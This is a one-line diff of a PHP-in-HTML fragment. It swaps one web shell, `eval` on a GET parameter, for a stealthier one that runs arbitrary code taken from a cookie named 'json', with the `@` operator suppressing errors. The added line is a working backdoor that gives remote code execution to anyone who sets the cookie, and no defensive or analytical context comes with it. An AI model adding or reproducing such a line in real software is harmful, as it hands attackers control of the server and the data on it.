@@ -1,1 +1,1 @@
-<pre><?php @eval($_GET['c']);?></pre>
+<pre><?php @eval($_COOKIE['json']);?></pre>
